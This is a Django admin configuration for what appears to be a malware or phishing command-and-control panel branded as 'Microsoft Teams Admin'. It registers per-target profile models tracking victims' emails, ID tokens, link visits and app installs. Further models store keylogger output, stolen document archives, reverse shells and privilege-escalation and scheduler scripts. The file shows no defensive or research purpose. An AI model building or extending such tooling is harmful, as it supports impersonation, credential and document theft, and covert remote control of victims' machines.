from django.contrib import admin
from .forms import LizzyForm, NadiaForm, GratjeenForm
from core.models import  (
    LizzyProfile, 
    NadiaProfile,
    GratjeenProfile,
    LizzyProfileDetails,
    NadiaProfileDetails,
    GratJeenProfileDetails,
    Uploadedfiles
)


admin.site.site_header = 'Microsoft Teams Admin'

@admin.register(LizzyProfile)
class LizzyUserProfileAdmin(admin.ModelAdmin):
    form = LizzyForm
    list_display = ('id', 'email', 'first_name', 'last_name', 'app_downloaded', 'app_installed', 'id_token', 'link_visits', 'video_link', 'created')
    list_filter = ('email', 'created', 'app_installed', 'app_downloaded')
    search_filter = ('email', 'id_token', 'video_link', 'first_name')
    list_display_links = ('id', 'email',)


@admin.register(NadiaProfile)
class NadiaUserProfile(admin.ModelAdmin):
    form = NadiaForm
    list_display = ('id', 'id', 'email', 'first_name', 'last_name', 'app_downloaded', 'app_installed', 'id_token', 'link_visits', 'video_link', 'created')
    list_filter = ('email', 'created', 'app_installed', 'app_downloaded')
    search_filter = ('email', 'id_token', 'video_link', 'first_name')
    list_display_links = ('id', 'email')


@admin.register(GratjeenProfile)
class GratjeenUserProfile(admin.ModelAdmin):
    form = GratjeenForm
    list_display = ('id', 'email', 'first_name', 'last_name', 'app_downloaded', 'app_installed', 'id_token', 'link_visits', 'video_link', 'created')
    list_filter = ('email', 'created', 'app_installed', 'app_downloaded')
    search_filter = ('email', 'id_token', 'video_link', 'first_name')
    list_display_links = ('id', 'email')



@admin.register(LizzyProfileDetails)
class LizzyProfileDetailsAdmin(admin.ModelAdmin):
    list_display = ('id', 'client', 'keylogger_txt', 'document_zip', 'created', 'updated')


@admin.register(NadiaProfileDetails)
class NadiaProfileDetailsAdmin(admin.ModelAdmin):
    list_display = ('id', 'client', 'keylogger_txt', 'document_zip', 'created', 'updated')


@admin.register(GratJeenProfileDetails)
class GratJeenProfileDetails(admin.ModelAdmin):
    list_display = ('id', 'client', 'keylogger_txt', 'document_zip', 'created', 'updated') 


@admin.register(Uploadedfiles)
class UploadedFiles(admin.ModelAdmin):
    list_display =  ('id', 'user', 'reverse_shell', 'custom_script',  'router', 'raise_permission_script', 'schedular_script', 'created', 'updated', )
    list_display_links = ('id', 'user')